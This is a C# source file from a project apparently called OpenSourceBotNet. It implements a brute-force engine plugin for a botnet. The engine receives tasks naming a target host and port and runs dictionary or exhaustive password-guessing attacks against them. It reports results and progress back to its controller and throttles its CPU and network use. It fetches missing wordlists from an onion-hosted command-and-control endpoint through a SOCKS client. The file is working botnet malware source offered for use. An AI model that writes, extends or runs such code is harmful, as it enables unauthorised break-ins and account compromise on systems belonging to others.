using System;
using System.Collections;

using System.Text;

using OpenSourceBotNet;
using OpenSourceBotNet.Core;
using OpenSourceBotNet.Core.Helpers;
using OpenSourceBotNet.Plugins.Engines;
using OpenSourceBotNet.Services.Resources;

using OpenSourceBotNet.Plugins.Engines;
using OpenSourceBotNet.Plugins.Engines.Plugins;

namespace OpenSourceBotNet.Plugins.Engines
{
    public class BruteForceEngine : FluxEngine
    {
        public string sPluginTargetHost;
        public int iPluginTargetPort;
        public string sPluginTargetVersion;

        public enum eBruteForceType
        {
            Dictionary,
            BruteForce
        }

        public enum eBruteForceStyle
        {
            Alpha,
            AlphaNumeric,
            FullKeyboard
        }

        /// <summary>
        /// Dictionary Attack Variables
        /// </summary>
        public string sDictionaryName;
        public string sDictionaryStart;
        public string sDictionaryStop;

        public ArrayList alDictionaryQueue = new ArrayList();

        /// <summary>
        /// Brute Force Attack Variables
        /// </summary>
        public string sBruteForceLength;
        public string sBruteForceStart;
        public string sBruteForceStop;

        public eBruteForceType BruteForceType;
        public eBruteForceStyle BruteForceStyle;

        public char cStopChar = char.Parse(System.Text.Encoding.ASCII.GetString(new byte[] { byte.Parse("127") }));

        public BruteForceEngine(FluxEngineWorkObject ewobject) : base(ewobject)
        {
            string sBruteForceType = ewObject.sPluginWork.Substring(0, 4);
            string[] spWork = ewObject.sPluginWork.Split('|');

            switch (sBruteForceType)
            {
                // dict|dict_name|start|stop|target|port
                case "dict":
                    BruteForceType = eBruteForceType.Dictionary;
                    sDictionaryName = spWork[1];
                    sDictionaryStart = spWork[2];
                    sDictionaryStop = spWork[3];
                    break;

                // forc|style|length|start|stop|target|port
                case "forc":
                    BruteForceType = eBruteForceType.BruteForce;

                    switch (spWork[1])
                    {
                        case "alpha":
                            BruteForceStyle = eBruteForceStyle.Alpha;
                            break;
                        case "alphanumeric":
                            BruteForceStyle = eBruteForceStyle.AlphaNumeric;
                            break;
                        case "fullkeyboard":
                            BruteForceStyle = eBruteForceStyle.FullKeyboard;
                            break;
                    }

                    sBruteForceLength = spWork[2];
                    sBruteForceStart = spWork[3];
                    sBruteForceStop = spWork[4];
                    break;
            }

            sPluginTargetHost = spWork[spWork.Length - 2];
            iPluginTargetPort = int.Parse(spWork[spWork.Length - 1]);
        }

        public override void Ignition(object obj)
        {
            sPluginTargetVersion = ((BruteForceEnginePlugin)pluginClassObject).VerifyTarget(sPluginTargetHost, iPluginTargetPort);

            if (sPluginTargetVersion == "")
            {
                fireFailed(ewObject.iThreadID, ewObject.sTaskUUID, "broken_target");
            }
            else
            {
                switch (BruteForceType)
                {
                    case eBruteForceType.BruteForce:
                        startBruteForce();
                        break;
                    case eBruteForceType.Dictionary:
                        startDictionary();
                        break;
                }
            }
        }

        public void startBruteForce()
        {
            string sCurrentPrefix = sBruteForceStart.Substring(0, sBruteForceStart.Length - 1);
            char cCurrentChar = sBruteForceStart.Substring(sCurrentPrefix.ToCharArray().Length - 1).ToCharArray()[0];
            bool bFireFailed = true;
            int iCountIterations = 0;

            while (sCurrentPrefix.StartsWith(sBruteForceStop) == false && int.Parse(sBruteForceLength) > sCurrentPrefix.Length)
            {
                DateTime dtStart = DateTime.Now;
                object[] bSuccess = ((BruteForceEnginePlugin)pluginClassObject).Attack(sPluginTargetHost, iPluginTargetPort, sPluginTargetVersion, sCurrentPrefix + cCurrentChar.ToString());
                DateTime dtStop = DateTime.Now;

                TimeSpan ts = dtStop.Subtract(dtStart);

                NetworkThrottle.ThrottleNetworkUpload();

                fireResponseTime(ewObject.iThreadID, ts.TotalSeconds, sPluginTargetHost);

                if (bSuccess[0] != null)
                {
                    if ((bool)bSuccess[0] == false)
                    {
                        fireFailed(ewObject.iThreadID, ewObject.sTaskUUID, (string)bSuccess[1]);
                        bFireFailed = true;
                    }

                    if ((bool)bSuccess[0] == true)
                    {
                        fireSuccess(ewObject.iThreadID, ewObject.sTaskUUID, (string)bSuccess[1]);
                        bFireFailed = false;
                        break;
                    }
                }

                bool bNeedNewPrefix = false;

                cCurrentChar = getNextChar(cCurrentChar);

                if (cCurrentChar == '0' || cCurrentChar == 'A' || cCurrentChar == '!')
                {
                    switch (BruteForceStyle)
                    {
                        case eBruteForceStyle.Alpha:
                            if (cCurrentChar == 'A')
                            {
                                bNeedNewPrefix = true;
                            }
                            break;
                        case eBruteForceStyle.AlphaNumeric:
                            if (cCurrentChar == '0')
                            {
                                bNeedNewPrefix = true;
                            }
                            break;
                        case eBruteForceStyle.FullKeyboard:
                            if (cCurrentChar == '!')
                            {
                                bNeedNewPrefix = true;
                            }
                            break;
                    }

                    if (bNeedNewPrefix == true)
                    {
                        sCurrentPrefix = getNextPrefix(sCurrentPrefix);
                    }
                }

                if (iCountIterations == 10000)
                {
                    iCountIterations = 0;
                    fireSaveWork(ewObject.iThreadID, ewObject.sTaskUUID, sCurrentPrefix + cCurrentChar.ToString());
                }

                iCountIterations++;
            }

            if (bFireFailed == true)
            {
                fireFailed(ewObject.iThreadID, ewObject.sTaskUUID, "exhausted");
            }
        }

        public string getNextPrefix(string sPrefix)
        {
            char[] cArray = sPrefix.ToCharArray();

            bool bAddNewChar = false;
            char cNewCharToAdd = 'A';

            string sNewPrefix = "";
            bool bExitLoop = false;

            for (int i = cArray.Length - 1; i > -1; i--)
            {
                if (bExitLoop == true)
                {
                    break;
                }

                cArray[i]++;

                if (cArray[i] == ':' || cArray[i] == '{' || cArray[i] == '[' || cArray[i] == cStopChar)
                {
                    switch (BruteForceStyle)
                    {
                        case eBruteForceStyle.Alpha:
                            if (cArray[i] == '{')
                            {
                                cArray[i] = 'A';

                                if (i == 0 && getPrefix(cArray).Replace("A", "") == "")
                                {
                                    bAddNewChar = true;
                                }
                            }
                            else if (cArray[i] == '[')
                            {
                                cArray[i] = 'a';
                                bExitLoop = true;
                            }
                            break;
                        case eBruteForceStyle.AlphaNumeric:
                            if (cArray[i] == ':')
                            {
                                cArray[i] = 'A';
                                bExitLoop = true;
                            }
                            else if (cArray[i] == '[')
                            {
                                cArray[i] = 'a';
                                bExitLoop = true;
                            }
                            else if (cArray[i] == '{')
                            {
                                cArray[i] = '0';

                                if (i == 0 && getPrefix(cArray).Replace("0", "") == "")
                                {
                                    bAddNewChar = true;
                                }
                            }
                            break;
                        case eBruteForceStyle.FullKeyboard:
                            if (cArray[i] == cStopChar)
                            {
                                cArray[i] = '!';

                                if (i == 0 && cArray[i] == '!')
                                {
                                    string a = "asdf";
                                }

                                if (i == 0 && getPrefix(cArray).Replace("!", "") == "")
                                {
                                    bAddNewChar = true;
                                }
                            }
                            else
                            {
                                bExitLoop = true;
                            }
                            break;
                    }
                }
                else
                {
                    break;
                }
            }

            sNewPrefix = getPrefix(cArray);

            if (bAddNewChar == true)
            {
                sNewPrefix = sNewPrefix + sNewPrefix.Substring(sNewPrefix.Length - 1);
            }

            return sNewPrefix;
        }

        public string getPrefix(char[] cArray)
        {
            string sNewPrefix = "";

            foreach (char c in cArray)
            {
                sNewPrefix += c.ToString();
            }

            return sNewPrefix;
        }

        public char getNextChar(char cCurrentChar)
        {
            cCurrentChar++;

            switch (BruteForceStyle)
            {
                case eBruteForceStyle.Alpha:
                    switch (cCurrentChar)
                    {
                        case '[':
                            cCurrentChar = 'a';
                            break;
                        case '{':
                            cCurrentChar = 'A';
                            break;
                    }
                    break;
                case eBruteForceStyle.AlphaNumeric:
                    switch (cCurrentChar)
                    {
                        case ':':
                            cCurrentChar = 'A';
                            break;
                        case '[':
                            cCurrentChar = 'a';
                            break;
                        case '{':
                            cCurrentChar = '0';
                            break;
                    }
                    break;
                case eBruteForceStyle.FullKeyboard:
                    if (cCurrentChar == cStopChar)
                    {
                        cCurrentChar = '!';
                    }
                    break;
            }

            return cCurrentChar;
        }

        public void startDictionary()
        {
            bool bFireFailed = true;

            string sDictionaryPath = System.Windows.Forms.Application.StartupPath + "\\dicts\\";
            if (System.IO.Directory.Exists(sDictionaryPath) == false)
            {
                System.IO.Directory.CreateDirectory(sDictionaryPath);
            }

            if (System.IO.File.Exists(sDictionaryPath + sDictionaryName + ".dic") == false)
            {
                SocksWebClient wc = WebclientFactory.getWebClient();
                wc.DownloadFile(FluxGlobal.sOnion + "api/bots/fetchresource.php?type=dict&name=" + sDictionaryName + ".dic", sDictionaryPath + sDictionaryName + ".dic");
            }

            System.IO.StreamReader sr = System.IO.File.OpenText(sDictionaryPath + sDictionaryName + ".dic");
            bool bAdd = false;
            while (sr.Peek() >= 0)
            {
                string word = sr.ReadLine();

                if (word.StartsWith(sDictionaryStart))
                {
                    bAdd = true;
                }

                if (bAdd == true)
                {
                    alDictionaryQueue.Add(word);
                }

                CPUThrottle.ThrottleCPU();

                if (word.StartsWith(sDictionaryStop))
                {
                    break;
                }
            }
            sr.Close();

            double dAvgResponseTime = 0.0;

            while (alDictionaryQueue.Count > 0)
            {
                string word = alDictionaryQueue[0].ToString();
                alDictionaryQueue.RemoveAt(0);

                DateTime dtStart = DateTime.Now;
                object[] bSuccess = ((BruteForceEnginePlugin)pluginClassObject).Attack(sPluginTargetHost, iPluginTargetPort, sPluginTargetVersion, word);
                DateTime dtStop = DateTime.Now;

                TimeSpan ts = dtStop.Subtract(dtStart);

                fireResponseTime(ewObject.iThreadID, ts.TotalSeconds, sPluginTargetHost);

                if (bSuccess[0] != null)
                {
                    if ((bool)bSuccess[0] == false)
                    {
                        fireFailed(ewObject.iThreadID, ewObject.sTaskUUID, (string)bSuccess[1]);
                        bFireFailed = false;
                        break;
                    }

                    if ((bool)bSuccess[0] == true)
                    {
                        fireSuccess(ewObject.iThreadID, ewObject.sTaskUUID, (string)bSuccess[1]);
                        bFireFailed = false;
                        break;
                    }
                }

                CPUThrottle.ThrottleCPU();
                NetworkThrottle.ThrottleNetwork();
            }

            if (bFireFailed == true)
            {
                fireFailed(ewObject.iThreadID, ewObject.sTaskUUID, "exhausted");
            }
        }
    }
}
